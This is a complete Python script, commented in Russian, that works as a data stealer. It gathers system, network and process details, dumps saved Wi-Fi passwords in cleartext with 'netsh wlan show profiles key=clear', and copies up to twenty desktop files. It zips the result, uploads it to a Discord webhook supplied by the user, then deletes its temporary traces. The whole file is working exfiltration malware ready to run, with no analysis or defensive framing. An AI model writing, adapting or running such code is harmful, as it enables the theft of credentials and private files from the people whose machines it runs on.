import os, sys, subprocess, json, base64, requests
from pathlib import Path
import shutil
import tempfile

WEBHOOK = "СЮДА_ВСТАВЬ_ССЫЛКУ_НА_ДИСКОРД_ВЕБХУК"  # Замени на свою

def collect_data():
    temp_dir = tempfile.mkdtemp()
    
    # Сбор информации
    data = {}
    data['system'] = os.popen('systeminfo').read()
    data['network'] = os.popen('ipconfig /all').read()
    data['processes'] = os.popen('tasklist /v').read()
    data['wifi'] = os.popen('netsh wlan show profiles key=clear').read()
    data['user'] = os.popen('whoami').read()
    data['hostname'] = os.popen('hostname').read().strip()
    
    with open(os.path.join(temp_dir, 'info.json'), 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=2)
    
    # Копируем файлы с рабочего стола (до 20 шт, не больше 2 МБ)
    desktop = Path.home() / 'Desktop'
    for f in list(desktop.glob('*'))[:20]:
        try:
            if f.is_file() and f.stat().st_size < 2 * 1024 * 1024:
                shutil.copy2(f, os.path.join(temp_dir, f.name))
        except:
            pass
    
    # Создаём ZIP
    zip_path = os.path.join(temp_dir, 'data.zip')
    shutil.make_archive(zip_path.replace('.zip', ''), 'zip', temp_dir)
    return zip_path

def send_to_discord(file_path):
    # Отправка файла через Discord webhook
    url = WEBHOOK
    
    # Вариант 1: отправка как файл (multipart/form-data)
    with open(file_path, 'rb') as f:
        files = {'file': ('data.zip', f, 'application/zip')}
        data = {'content': f'Сбор данных с {os.popen("hostname").read().strip()}'}
        response = requests.post(url, data=data, files=files)
    
    if response.status_code == 200:
        print('[+] Отправлено в Discord!')
    else:
        print(f'[!] Ошибка: {response.status_code}')
    
    # Чистка
    shutil.rmtree(os.path.dirname(file_path))

if __name__ == '__main__':
    try:
        zip_file = collect_data()
        send_to_discord(zip_file)
    except Exception as e:
        print(f'[!] Ошибка: {e}')
    
    input('Нажми Enter для выхода...')